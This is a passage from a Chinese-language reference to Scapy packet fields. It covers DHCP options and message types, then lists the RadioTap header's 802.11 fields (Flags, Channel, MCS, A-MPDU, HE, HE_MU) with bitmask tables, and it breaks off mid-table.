IPField</span></p><ul><li><span>NIS服务器地址</span></li></ul></li><li><p><span>NTP_server: IPField</span></p><ul><li><span>NIP服务器地址</span></li></ul></li><li><p><span>vendor_specific: NoneType</span></p></li><li><p><span>NetBIOS_server: IPField</span></p><ul><li><span>NETBIOS名称服务器地址</span></li></ul></li><li><p><span>NetBIOS_dist_server: IPField</span></p><ul><li><span>NETBIOS数据报分布</span></li></ul></li><li><p><span>static-routes: ByteField</span></p><ul><li><span>静态路由表</span></li></ul></li><li><p><span>netbios-scope: NoneType</span></p></li><li><p><span>font-servers: IPField</span></p><ul><li><span>X Window Font Server</span></li></ul></li><li><p><span>x-display-manager: IPField</span></p><ul><li><span>X Window Display Manager</span></li></ul></li><li><p><span>requested_addr: IPField</span></p><ul><li><span>请求的IP地址</span></li></ul></li><li><p><span>lease_time: IntField</span></p><ul><li><span>IP地址租用时间</span></li></ul></li><li><p><span>dhcp-option-overload: ByteField</span></p><ul><li><p><span>重载“sname”或“file”</span></p><ul><li><span>1: &#39;file&#39;</span></li><li><span>2: &#39;sname</span></li><li><span>3: 两个字段都</span></li></ul></li></ul></li><li><p><span>message-type: ByteEnumField</span></p><ul><li><p><span>DHCP消息类型</span></p></li><li><p><span>Value取值: </span></p><ul><li><p><span>discover</span>
<span>-DHCP客户端在网络上发送DHCP发现广播, 以查找DHCP服务器. 如果没有来自DHCP服务器的响应, 则客户端将为其分配一个自动专用IPv4地址（APIPA）</span></p></li><li><p><span>offer</span></p><ul><li><span>网络上收到DHCP发现消息的DHCP服务器以DHCP提供消息作为响应, 该消息为客户端提供IPv4地址租约. </span></li></ul></li><li><p><span>request</span></p><ul><li><span>客户端通过广播所提供的IPv4地址的DHCP请求消息来接受收到的第一个提议</span></li></ul></li><li><p><span>decline</span></p><ul><li><span>如果DHCP客户端确定所提供的TCP / IP配置参数无效, 则它将DHCPDecline数据包发送到服务器. 此后, 客户端必须再次开始DHCP租用过程</span></li></ul></li><li><p><span>ack</span></p><ul><li><span>服务器通过向客户端发送DHCP确认消息来接受请</span></li></ul></li><li><p><span>nak</span></p><ul><li><span>如果无法使用DHCP客户端请求的IPv4地址（另一个设备可能正在使用该IPv4地址）, 则DHCP服务器将以DHCPNak（否定确认）数据包进行响应. 此后, 客户端必须再次开始DHCP租用过程. </span></li></ul></li><li><p><span>release</span></p><ul><li><span>DHCP客户端向服务器发送DHCPRelease数据包, 以释放IPv4地址并取消所有剩余的租约. </span></li></ul></li><li><p><span>inform</span></p><ul><li><span>DHCPInform是在RFC 2131中定义的新的DHCP消息类型. DHCP客户端使用DHCPInform获取DHCP选项</span></li></ul></li><li><p><span>force_renew</span></p><ul><li><span>强制更新</span></li></ul></li><li><p><span>lease_query</span></p><ul><li><a href='https://tools.ietf.org/html/rfc4388' target='_blank' class='url'>https://tools.ietf.org/html/rfc4388</a></li></ul></li><li><p><span>lease_unassigne</span></p><ul><li><a href='https://tools.ietf.org/html/rfc4388' target='_blank' class='url'>https://tools.ietf.org/html/rfc4388</a></li></ul></li><li><p><span>lease_unknown</span></p><ul><li><a href='https://tools.ietf.org/html/rfc4388' target='_blank' class='url'>https://tools.ietf.org/html/rfc4388</a></li></ul></li><li><p><span>lease_active</span></p><ul><li><a href='https://tools.ietf.org/html/rfc4388' target='_blank' class='url'>https://tools.ietf.org/html/rfc4388</a></li></ul></li></ul></li></ul></li><li><p><span>server_id: IPField</span></p><ul><li><span>DHCP服务器ID</span></li></ul></li><li><p><span>param_req_list: FieldListField</span></p><ul><li><span>参数请求列表</span></li></ul></li><li><p><span>error_message: NoneType</span></p></li><li><p><span>max_dhcp_size: ShortField</span></p><ul><li><span>DHCP最大消息大小</span></li></ul></li><li><p><span>renewal_time: IntField</span></p><ul><li><span>DHCP更新(T1)时间</span></li></ul></li><li><p><span>rebinding_time: IntField</span></p><ul><li><span>DHCP重新结合(T2)时间</span></li></ul></li><li><p><span>vendor_class_id: NoneType</span></p></li><li><p><span>client_id: NoneType</span></p></li><li><p><span>nwip-domain-name: NoneType</span></p></li><li><p><span>NISplus_domain: NoneType</span></p></li><li><p><span>NISplus_server: IPField</span></p><ul><li><span>NIS+v3服务器地址</span></li></ul></li><li><p><span>boot-file-name: StrField</span></p><ul><li><span>BOOT文件名</span></li></ul></li><li><p><span>mobile-ip-home-agent: IPField</span></p><ul><li><span>Home Agent Addresses</span></li></ul></li><li><p><span>SMTP_server: IPField</span></p><ul><li><span>SMTP服务器地址</span></li></ul></li><li><p><span>POP3_server: IPField</span></p><ul><li><span>POP3服务器地址</span></li></ul></li><li><p><span>NNTP_server: IPField</span></p><ul><li><span>NNTP服务器地址</span></li></ul></li><li><p><span>WWW_server: IPField</span></p><ul><li><span>WWW服务器地址</span></li></ul></li><li><p><span>Finger_server: IPField</span></p><ul><li><span>Finger服务器地址</span></li></ul></li><li><p><span>IRC_server: IPField</span></p><ul><li><span>IRC服务器地址</span></li></ul></li><li><p><span>StreetTalk_server: IPField</span></p><ul><li><span>StreetTalk服务器地址</span></li></ul></li><li><p><span>StreetTalk_Dir_Assistance: NoneType</span></p></li><li><p><span>client_FQDN: NoneType</span></p></li><li><p><span>relay_agent_Information: NoneType</span></p></li><li><p><span>client-last-transaction-time: IntField</span></p></li><li><p><span>associated-ip: IPField</span></p></li><li><p><span>subnet-selection: IPField</span></p><ul><li><span>子网选择选项</span></li></ul></li><li><p><span>end: NoneType</span></p></li></ul></li></ul></li></ul><p></details></p><p>&nbsp;</p><h2 id='十二wi-fi'><span>十二.Wi-Fi</span></h2><h3 id='121radiotapscapylayersdot11radiotap'><span>12.1.RadioTap:</span><code>scapy.layers.dot11.RadioTap</code></h3><blockquote><p><span>发送和接收802.11标准帧, 在发送802.11帧之前, 网络驱动程序在802.11帧之前添加radiotap报头;一旦网卡接收到无线帧, 网络驱动程序就会通知MAC层这个帧包含了radiotap报头,当无线网络接口处monitor模式时,内核会生成一个名为RadioTap的数据添加在IEEE802.11数据帧(MPDU)的前面,该Radiotap记录了热点的信息,如信号强度、MPDU帧信息等信息. 意思就是在正常的IEEE802.11数据帧前面,核又额外给你加了一块RadioTap类型的数据,这块数据记录了一些无线网的属性. </span></p></blockquote><ul><li><a href='#22wi-fi启动监听模式'><span>wi-fi启动监听模式</span></a></li></ul><details></details><ul><li><p><span>version </span></p><ul><li><span>Verion (8 bits)</span></li><li><span>目前应为0</span></li></ul></li><li><p><span>pad</span></p><ul><li><span>Pad (8 bits)</span></li><li><span>目前未使用, 占位符</span></li></ul></li><li><p><span>len</span></p><ul><li><span>Length (16 bits)</span></li><li><span>radiotap数据的整个长度, 包括radiotap头 </span></li></ul></li><li><p><span>notdecoded</span></p></li><li><p><span>present</span></p><ul><li><p><span>Present (32 bits)</span></p></li><li><p><span>数据段掩码, 小端字节序</span></p></li><li><p><span>位置对应</span></p><ul><li><p><code>TSFT</code></p><ul><li><span>结构: 64 bits Mactime</span></li><li><span>单元: 微秒</span></li><li><span>变量名: mac_timestamp</span></li><li><span>当MPDU的第一位到达MA​​C时, MAC的64位802.11时间同步功能计时器的微秒值. 仅适用于接收的帧                </span></li></ul></li><li><p><code>Flags</code></p><ul><li><p><span>结构: 8 bits flags</span></p></li><li><p><span>单位: bitmap</span></p></li><li><p><span>变量名: Flags</span></p><figure><table><thead><tr><th><span>标志</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x01</span></td><td><span>在CFP中发送/接收</span></td></tr><tr><td><span>0x02</span></td><td><span>用简短的序言发送/接收</span></td></tr><tr><td><span>0x04</span></td><td><span>使用WEP加密发送/接收</span></td></tr><tr><td><span>0x08</span></td><td><span>碎片发送/接收</span></td></tr><tr><td><span>0x10</span></td><td><span>框架包括FCS</span></td></tr><tr><td><span>0x20</span></td><td><span>帧在802.11标头和有效负载之间填充 (到32位边界)</span></td></tr><tr><td><span>0x40</span></td><td><span>帧未通过FCS检查</span></td></tr><tr><td><span>0x80</span></td><td><span>使用的帧短保护间隔 (HT)</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>Rate</code></p><ul><li><span>结构: 8 bits rate</span></li><li><span>单位: 500 Kbps</span></li><li><span>TX / RX数据速率. </span></li><li><span>变量名: Rate</span></li></ul></li><li><p><code>Channel</code></p><ul><li><p><span>结构: 16 bits frequency, 16 bits flags</span></p></li><li><p><span>单位: MHz, bitmap</span></p></li><li><p><span>Tx/Rx频率(MHz), 后跟标志</span></p></li><li><p><span>变量名: ChannelFrequency</span></p></li><li><p><span>变量名: ChannelFlags </span></p><figure><table><thead><tr><th><span>标志</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0010</span></td><td><span>涡轮通道</span></td></tr><tr><td><span>0x0020</span></td><td><span>CCK通道</span></td></tr><tr><td><span>0x0040</span></td><td><span>OFDM信道</span></td></tr><tr><td><span>0x0080</span></td><td><span>2 GHz频谱通道</span></td></tr><tr><td><span>0x0100</span></td><td><span>5 GHz频谱通道</span></td></tr><tr><td><span>0x0200</span></td><td><span>仅允许被动扫描</span></td></tr><tr><td><span>0x0400</span></td><td><span>动态CCK-OFDM信道</span></td></tr><tr><td><span>0x0800</span></td><td><span>GFSK通道 (FHSS PHY)</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>FHSS</code></p><ul><li><span>结构: 8 bits hop set, 8 bits hop pattern</span></li><li><span>跳频无线电的跳集和模式</span></li></ul></li><li><p><code>dBm_AntSignal</code></p><ul><li><span>结构: 8 sign bits</span></li><li><span>单位: 分贝</span></li><li><span>变量名: dBm_AntSignal</span></li><li><span>天线的RF信号功率. 该值指示天线处的RF信号功率, 以1mW为单位的分贝差. </span></li></ul></li><li><p><code>dBm_AntNoise</code></p><ul><li><span>Antenna noise</span></li><li><span>结构: 8 sign bits</span></li><li><span>单位: 分贝</span></li><li><span>变量名: dBm_AntNoise</span></li><li><span>天线的射频噪声功率.该值指示天线处的RF信号功率, 以1mW为单位的分贝差. </span></li></ul></li><li><p><code>Lock_Quality</code></p><ul><li><span>结构: 16 bits</span></li><li><span>变量名: Lock_Quality</span></li><li><span>Barker Lock的质量. 单调不降低, 锁定强度更高. 数据表中称为“信号质量”</span></li></ul></li><li><p><code>TX_Attenuation</code></p></li><li><p><code>dB_TX_Attenuation</code></p><ul><li><span>结构: 16 bits</span></li><li><span>在工厂校准时, 传输功率以与最大功率设置的分贝距离表示. 0是最大功率. 单调不递减的低功率级. </span></li></ul></li><li><p><code>dBm_TX_Power</code></p><ul><li><span>结构: 8 sign bits</span></li><li><span>单位: dBm</span></li><li><span>发射功率以dBm(1毫瓦参考分贝)表示. 这是在天线端口测量的绝对功率电平. </span></li></ul></li><li><p><code>Antenna</code></p><ul><li><span>结构: 8 bits</span></li><li><span>单位: 天线索引</span></li><li><span>变量名: Antenna</span></li><li><span>此数据包的Rx/Tx天线的指示.第一个天线是天线0. </span></li></ul></li><li><p><code>dB_AntSignal</code></p><ul><li><span>结构: 8 bits</span></li><li><span>天线处的RF信号功率, 与任意固定参考之间的分贝差. 该字段包含单个无符号的8位值. </span></li></ul></li><li><p><code>dB_AntNoise</code></p><ul><li><span>结构: 8 bits</span></li><li><span>单位: dB</span></li><li><span>天线的RF噪声功率, 与任意固定参考之间的分贝差. 该字段包含单个无符号的8位值. </span></li></ul></li><li><p><code>RXFlags</code></p><ul><li><p><span>结构: 16 bits</span></p></li><li><p><span>接收帧的属性</span></p></li><li><p><span>变量名: RXFlags</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0001</span></td><td><span>保留(FCS失败, 但这是常规标志)</span></td></tr><tr><td><span>0x0002</span></td><td><span>PLCP CRC检查失败</span></td></tr><tr><td><span>0xfffc</span></td><td><span>保留以备将来扩展</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>TXFlags</code></p><ul><li><span>变量名: TXFlags</span></li><li><a href='https://www.radiotap.org/fields/TX%20flags.html' target='_blank' class='url'>https://www.radiotap.org/fields/TX%20flags.html</a></li></ul></li><li><p><code>b17</code></p><ul><li><a href='https://www.radiotap.org/fields/RSSI.html' target='_blank' class='url'>https://www.radiotap.org/fields/RSSI.html</a></li><li><a href='https://www.radiotap.org/fields/RTS%20retries.html' target='_blank' class='url'>https://www.radiotap.org/fields/RTS%20retries.html</a></li></ul></li><li><p><code>b18</code></p><ul><li><a href='https://www.radiotap.org/fields/data%20retries.html' target='_blank' class='url'>https://www.radiotap.org/fields/data%20retries.html</a></li></ul></li><li><p><code>ChannelPlus</code></p><ul><li><a href='https://www.radiotap.org/fields/XChannel.html' target='_blank' class='url'>https://www.radiotap.org/fields/XChannel.html</a></li><li><span>变量名: ChannelPlusFlags, ChannelPlusFrequency, ChannelPlusNumber</span></li></ul></li><li><p><code>MCS</code></p><ul><li><p><span>结构: 8 bits known, 8 bits flags, 8 bits mcs</span></p></li><li><p><span>变量名: MCS_index</span></p><ul><li><span>mcs</span></li></ul></li><li><p><span>变量名: knownMCS</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x01</span></td><td><span>带宽已知</span></td></tr><tr><td><span>0x02</span></td><td><span>mcs索引已知(在mcs部分的字段中)</span></td></tr><tr><td><span>0x04</span></td><td><span>guard 间隔已知</span></td></tr><tr><td><span>0x08</span></td><td><span>HT格式已知</span></td></tr><tr><td><span>0x10</span></td><td><span>FEC类型已知</span></td></tr><tr><td><span>0x20</span></td><td><span>STBC已知</span></td></tr><tr><td><span>0x40</span></td><td><span>Ness 已知(扩展空间流的数量)</span></td></tr><tr><td><span>0x80</span></td><td><span>Ness数据-扩展空间流数量的1 bit(MSB)</span></td></tr></tbody></table></figure></li><li><p><span>flags </span></p><ul><li><span>变量名: HT_format</span></li><li><span>变量名: Ness_LSB</span></li><li><span>变量名: FEC_type</span></li><li><span>变量名: MCS_bandwidth</span></li><li><span>变量名: guard_interval</span></li><li><span>变量名: STBC_stream</span></li></ul><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x03</span></td><td><span>带宽 (0: 20, 1: 40, 2: 20L, 3: 20U)</span></td></tr><tr><td><span>0x04</span></td><td><span>guard 间隔 - 0: long GI, 1: short GI</span></td></tr><tr><td><span>0x08</span></td><td><span>HT 格式 - 0: mixed, 1: greenfield</span></td></tr><tr><td><span>0x10</span></td><td><span>FEC 类型 - 0: BCC, 1: LDPC</span></td></tr><tr><td><span>0x60</span></td><td><span>STBC流的数量</span></td></tr><tr><td><span>0x80</span></td><td><span>Ness-bit 扩展空间流数量的0 bit(LSB)</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>A_MPDU</code></p><ul><li><p><span>A-MPDU status</span></p></li><li><p><span>结构: 32 bits reference number, 16 bits flags, 8 bits delimiter CRC value, 8 bits reserved</span></p></li><li><p><span>该字段的存在表明帧是作为a-MPDU的一部分接收的. reference number由捕获设备生成, 并且在A-MPDU的每个子帧中都是相同的. 由于捕获设备可能能够捕获多个通道, 或者可以合并来多个(并发)捕获的数据, 所以不能保证reference number在不同通道之间是惟一的. 因此, 应用程序应该使用通道信息和reference number来识别属于同一A-MPDU的子帧</span></p></li><li><p><span>变量名: A_MPDU_ref</span></p></li><li><p><span>变量名: A_MPDU_flags</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0001</span></td><td><span>驱动程序报告0长度子帧</span></td></tr><tr><td><span>0x0002</span></td><td><span>帧是长度为0的子帧(仅当设置为0x0001时有效)</span></td></tr><tr><td><span>0x0004</span></td><td><span>已知最后一个子帧(应为A-MPDU中的所有子帧设置)</span></td></tr><tr><td><span>0x0008</span></td><td><span>这个帧是最后一个子帧</span></td></tr><tr><td><span>0x0010</span></td><td><span>定界符CRC错误</span></td></tr><tr><td><span>0x0020</span></td><td><span>分隔符CRC值已知: 分隔符CRC值字段有效</span></td></tr><tr><td><span>0x0040</span></td><td><span>EOF值</span></td></tr><tr><td><span>0x0080</span></td><td><span>EOF值已知</span></td></tr><tr><td><span>0xff00</span></td><td><span>保留</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>VHT</code></p><ul><li><span>结构: 16bits known, 8 bits flags, 8 bits bandwidth, 8 bits mcs_nss[4], 8 bits coding, 8 bits group_id, 16 bits partial_aid</span></li><li><a href='https://www.radiotap.org/fields/VHT.html' target='_blank' class='url'>https://www.radiotap.org/fields/VHT.html</a></li><li><span>变量名: KnownVHT, PresentVHT, VHT_bandwidth, mcs_nss, GroupID, PartialAID</span></li></ul></li><li><p><code>timestamp</code></p><ul><li><p><span>结构: 64 bits timestamp, 16 bits accuracy, 8 bits unit/position, 8 bits flags</span></p></li><li><p><span>变量名: ts_accuracy</span></p></li><li><p><span>变量名: ts_position</span></p><figure><table><thead><tr><th><span>value</span></th><th><span>sampling position</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>first bit (or symbol containing it) of MPDU - matches TSFT field</span></td></tr><tr><td><span>1</span></td><td><span>signal acquisition at start of PLCP</span></td></tr><tr><td><span>2</span></td><td><span>end of PPDU</span></td></tr><tr><td><span>3</span></td><td><span>end of MPDU (after FCS)</span></td></tr><tr><td><span>4-14</span></td><td><span>reserved</span></td></tr><tr><td><span>15</span></td><td><span>unknown or vendor/OOB defined</span></td></tr></tbody></table></figure></li><li><p><span>变量名: ts_flags</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x01</span></td><td><span>32位计数器(高32位未使用)</span></td></tr><tr><td><span>0x02</span></td><td><span>accuracy已知</span></td></tr><tr><td><span>0xFC</span></td><td><span>保留</span></td></tr></tbody></table></figure></li><li><p><a href='https://www.radiotap.org/fields/timestamp.html' target='_blank' class='url'>https://www.radiotap.org/fields/timestamp.html</a></p></li></ul></li><li><p><code>HE</code></p><ul><li><p><span>结构: 16 bits data1, data2, data3, data4, data5, data6</span></p></li><li><p><span>该字段的存在指示使用HE PHY接收或发送了该帧, 此字段包含的数据大部分来自所有HE传输所共有的HE-SIG-A部分, 但是某些数据也可能会被计算 (例如, 当包含在HE_TRIG类型帧的传输时, 某些参数不包含在HE-SIG-A, 但由触发帧确定) .</span></p></li><li><p><span>但是, 对于HE_MU格式的PPDU, 它包含适用于PSDU编码的数据, 如果需要, 还包含HE-MU字段中包含的有关MU传输的更详细的信息, 在许多情况下, 不需要该字段, 因为有关已捕获的单个户的数据已在此处进行了编码. </span></p></li><li><p><span>对于MU传输, 在这种情况下, HE-MU-other-user 字段也可能出现一次或多次, 以捕获无法捕获其数据的额外用户. 如果为一个以上的用户捕获了数据, 则必须将多个数据包写入radiotap获中</span></p></li><li><p><span>变量名: he_data1</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0003</span></td><td><span>HE PPDU格式：0=HE_SU, 1=HE_EXT_SU, 2=HE_MU, 3=HE_TRIG</span></td></tr><tr><td><span>0x0004</span></td><td><span>BSS颜色已知</span></td></tr><tr><td><span>0x0008</span></td><td><span>光束变化已知</span></td></tr><tr><td><span>0x0010</span></td><td><span>UL/DL已知</span></td></tr><tr><td><span>0x0020</span></td><td><span>数据MCS已知</span></td></tr><tr><td><span>0x0040</span></td><td><span>数据DCM已知</span></td></tr><tr><td><span>0x0080</span></td><td><span>编码已知</span></td></tr><tr><td><span>0x0100</span></td><td><span>LDPC额外符号段已知</span></td></tr><tr><td><span>0x0200</span></td><td><span>STBC已知</span></td></tr><tr><td><span>0x0400</span></td><td><span>空间复用已知 (空间复用 1 for HE_TRIG format)</span></td></tr><tr><td><span>0x0800</span></td><td><span>空间复用2已知 (HE_TRIG格式) , 已知STA-ID (HE_MU格式)</span></td></tr><tr><td><span>0x1000</span></td><td><span>空间重用3已知 (HE_TRIG格式)</span></td></tr><tr><td><span>0x2000</span></td><td><span>空间重用4已知 (HE_TRIG格式)</span></td></tr><tr><td><span>0x4000</span></td><td><span>数据BW/RU分配已知</span></td></tr><tr><td><span>0x8000</span></td><td><span>多普勒已知</span></td></tr></tbody></table></figure></li><li><p><span>变量名: he_data2</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0001</span></td><td><span>pri/sec 80 MHz已知</span></td></tr><tr><td><span>0x0002</span></td><td><span>地理标志</span></td></tr><tr><td><span>0x0004</span></td><td><span>的LTF符号数已知</span></td></tr><tr><td><span>0x0008</span></td><td><span>Pre-FEC填充因子已知</span></td></tr><tr><td><span>0x0010</span></td><td><span>TxBF已知</span></td></tr><tr><td><span>0x0020</span></td><td><span>PE Disambiguity已知</span></td></tr><tr><td><span>0x0040</span></td><td><span>TXOP已知</span></td></tr><tr><td><span>0x0080</span></td><td><span>中间码周期已知</span></td></tr><tr><td><span>0x3f00</span></td><td><span>RU分配偏移</span></td></tr><tr><td><span>0x4000</span></td><td><span>RU分配偏移已知</span></td></tr><tr><td><span>0x8000</span></td><td><span>pri/sec 80 MHz (主要= 0, 次要= 1)</span></td></tr></tbody></table></figure></li><li><p><span>变量名: he_data3</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x003f</span></td><td><span>BSS颜色</span></td></tr><tr><td><span>0x0040</span></td><td><span>光束变化</span></td></tr><tr><td><span>0x0080</span></td><td><span>UL/DL</span></td></tr><tr><td><span>0x0f00</span></td><td><span>数据MCS (对于HE_MU格式, 不是来自HE-SIG-A的SIG-B MCS)</span></td></tr><tr><td><span>0x1000</span></td><td><span>数据DCM (请参阅数据MCS)</span></td></tr><tr><td><span>0x2000</span></td><td><span>编码 (0=BCC, 1=LDPC)</span></td></tr><tr><td><span>0x4000</span></td><td><span>LDPC额外符号段</span></td></tr><tr><td><span>0x8000</span></td><td><span>空时分组码</span></td></tr></tbody></table></figure></li><li><p><span>变量名: he_data4</span>
<span>值 | HE_SU和HE_EXT_SU格式的PPDU</span>
<span>0x000f | 空间复用</span>
<span>0xfff0 |  (保留) </span></p><p><span>值 | HE_TRIG格式PPDU</span>
<span>0x000f | 空间复用1</span>
<span>0x00f0 | 空间重用2</span>
<span>0x0f00 | 空间重用3</span>
<span>0xf000 | 空间重用4</span></p><p><span>值 | HE_MU格式PPDU</span>
<span>0x000f | 空间复用</span>
<span>0x7ff0 | 为其捕获数据的用户的STA-ID</span>
<span>0x8000 |  (保留) </span></p></li><li><p><span>变量名: he_data5</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x000f</span></td><td><span>数据带宽/RU分配 (0: 20、1: 40、2: 80、3: 160/80+80、4: 26-tone RU, 5: 52-tone RU, 6: 106-tone RU, 7: 242-tone RU, 8: 484-tone RU, 9: 996-tone RU, 10: 2x996-tone RU)</span></td></tr><tr><td><span>0x0030</span></td><td><span>GI (0: 0.8us, 1: 1.6us, 2: 3.2us, 3: 保留)</span></td></tr><tr><td><span>0x00c0</span></td><td><span>LTF符号大小 (0: 未知, 1: 1x, 2: 2x, 3: 4x)</span></td></tr><tr><td><span>0x0700</span></td><td><span>LTF符号的数量 (0: 1x, 1: 2x, 2: 4x, 3: 6x, 4: 8x, 5-7: 保留)</span></td></tr><tr><td><span>0x0800</span></td><td><span>(保留)</span></td></tr><tr><td><span>0x3000</span></td><td><span>Pre-FEC的填充因子</span></td></tr><tr><td><span>0x4000</span></td><td><span>TxBF</span></td></tr><tr><td><span>0x8000</span></td><td><span>PE Disambiguity</span></td></tr></tbody></table></figure></li><li><p><span>变量名: he_data6</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x000f</span></td><td><span>NSTS (时空流的实际数量, 0: 未知, 1: 1, 依此类推)</span></td></tr><tr><td><span>0x0010</span></td><td><span>多普勒值</span></td></tr><tr><td><span>0x00e0</span></td><td><span>(保留)</span></td></tr><tr><td><span>0x7f00</span></td><td><span>TXOP值</span></td></tr><tr><td><span>0x8000</span></td><td><span>中间码周期 (0: 10, 1: 20)</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>HE_MU</code></p><ul><li><p><span>结构</span></p><ul><li><span>16 bits flags1</span></li><li><span>16 bits flags2</span></li><li><span>8 bits RU_channel1[4]</span></li><li><span>8 bits RU_channel2[4]</span></li></ul></li><li><p><span>该字段包含与常规HE字段中尚未捕获的HE_MU类型的PPDU相关的数据. 这是公共数据(来自HE-SIG-A和HE-SIG-B), 每个用户的数据可以在HE-MU-其他用户字段中捕获</span></p></li><li><p><span>变量名: RU_channel1, RU_channel2</span></p><ul><li><p><span>Channel 1 /Channel 2使用情况和RU字节映射</span></p><ul><li><span>始终使用Channel 1的known字段, 用它来指示捕获了Channel 1的数据量</span></li><li><span>Channel 2的known字段仅用于40 MHz及更高​​频率, 用于指示捕获了Channel 2的数据量, 对于20 MHz, 应将其设置为0 (未知) </span></li></ul></li><li><p><span>数组中的RU八位字节(“RU_channel1”和“RU_channel2”)表示表28-26中的RU分配索引(“RU分配子字段”). </span></p></li><li><p><span>Channel 1的tones取决于known字段</span></p><ul><li><span>如果known=0, 则未报告任何数据(例如, 硬件不支持, 或SIG-B之一上的CRC错误)</span></li><li><span>如果known=1, 则根据下表, 带宽来自“HE-SIG-A中的带宽字段的带宽”标志2字段        </span></li></ul><figure><table><thead><tr><th><span>RU idx</span></th><th><span>bw=0 (20 MHz)</span></th><th><span>bw=1 (40 MHz)</span></th><th><span>bw=2 (80 MHz)</span></th><th><span>bw=3 (160 MHz)</span></th></tr></thead><tbody><tr><td><span>RU[0]</span></td><td><span>-122:122</span></td><td><span>-244:-3</span></td><td><span>-500:-259</span></td><td><span>-1012:-771</span></td></tr><tr><td><span>RU[1]</span></td><td><span>/</span></td><td><span>/</span></td><td><span>17:258</span></td><td><span>-495:-254</span></td></tr><tr><td><span>RU[2]</span></td><td><span>/</span></td><td><span>/</span></td><td><span>/</span></td><td><span>12:253</span></td></tr><tr><td><span>RU[3]</span></td><td><span>/</span></td><td><span>/</span></td><td><span>/</span></td><td><span>529:770</span></td></tr><tr><td><span>Center 26-tone</span></td><td><span>/</span></td><td><span>/</span></td><td><span>-16:-4, 4:16</span></td><td><span>-528:-516, -508:-496</span></td></tr></tbody></table></figure></li><li><p><span>Channel 2的tones取决于known字段</span></p><ul><li><span>如果known=0, 则未报告任何数据(例如, 硬件不支持, 或SIG-B之一上的CRC错误)</span></li><li><span>如果known=1, 则根据下表, 带宽来自“HE-SIG-A中的带宽字段的带宽”标志2字段                        </span></li></ul><figure><table><thead><tr><th><span>RU idx</span></th><th><span>bw=0 (20 MHz)</span></th><th><span>bw=1 (40 MHz)</span></th><th><span>bw=2 (80 MHz)</span></th><th><span>bw=3 (160 MHz)</span></th></tr></thead><tbody><tr><td><span>RU[0]</span></td><td><span>/</span></td><td><span>3:244</span></td><td><span>-258:-17</span></td><td><span>-770:529</span></td></tr><tr><td><span>RU[1]</span></td><td><span>/</span></td><td><span>/</span></td><td><span>259:500</span></td><td><span>-253:-12</span></td></tr><tr><td><span>RU[2]</span></td><td><span>/</span></td><td><span>/</span></td><td><span>/</span></td><td><span>254:495</span></td></tr><tr><td><span>RU[3]</span></td><td><span>/</span></td><td><span>/</span></td><td><span>/</span></td><td><span>771:1012</span></td></tr><tr><td><span>Center 26-tone</span></td><td><span>/</span></td><td><span>/</span></td><td><span>/</span></td><td><span>496:508, 516:528</span></td></tr></tbody></table></figure></li></ul></li><li><p><span>变量名: hemu_flags1, hemu_flags2</span></p><ul><li><p><span>Flags 1</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x000f</span></td><td><span>SIG-B MCS (来自SIG-A)</span></td></tr><tr><td><span>0x0010</span></td><td><span>SIG-B MCS已知</span></td></tr><tr><td><span>0x0020</span></td><td><span>SIG-B DCM (来自SIG-A)</span></td></tr><tr><td><span>0x0040</span></td><td><span>已知SIG-B DCM</span></td></tr><tr><td><span>0x0080</span></td><td><span>(Channel 2) 已知Center 26-tone RU bit</span></td></tr><tr><td><span>0x0100</span></td><td><span>已知Channel 1 RUs (取决于带宽)</span></td></tr><tr><td><span>0x0200</span></td><td><span>已知Channel 2 RUs (取决于带宽)</span></td></tr><tr><td><span>0x0c00</span></td><td><span>(保留)</span></td></tr><tr><td><span>0x1000</span></td><td><span>(Channel 1) 已知Center 26-tone RU bit</span></td></tr><tr><td><span>0x2000</span></td><td><span>(Channel 1) Center 26-tone RU值</span></td></tr><tr><td><span>0x4000</span></td><td><span>已知SIG-B Compression</span></td></tr><tr><td><span>0x8000</span></td><td><span>已知HE-SIG-B Symbols/MU-MIMO Users的#</span></td></tr></tbody></table></figure></li><li><p><span>Flags 2</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0003</span></td><td><span>HE-SIG-A中Bandwidth字段中的bandwidth (0-20 MHz, …, 3-160 / 80 + 80 MHz)</span></td></tr><tr><td><span>0x0004</span></td><td><span>HE-SIG-A中来自Bandwidth字段的bandwidth</span></td></tr><tr><td><span>0x0008</span></td><td><span>SIG-A的SIG-B compression</span></td></tr><tr><td><span>0x00f0</span></td><td><span># of HE-SIG-B Symbols - 1 or # of MU-MIMO Users - 1 from SIG-A</span></td></tr><tr><td><span>0x0300</span></td><td><span>HE-SIG-A中Bandwidth字段中的前导码打孔(0: 非打孔, 1: 打孔的次要20 MHz(主80兆赫, 若适用), 2:打孔, 但存在主40 MHz(主频80兆赫, 若适用))</span></td></tr><tr><td><span>0x0400</span></td><td><span>HE-SIG-A中Bandwidth字段中的前导码打孔</span></td></tr><tr><td><span>0x0800</span></td><td><span>(Channel 2) Center 26-tone 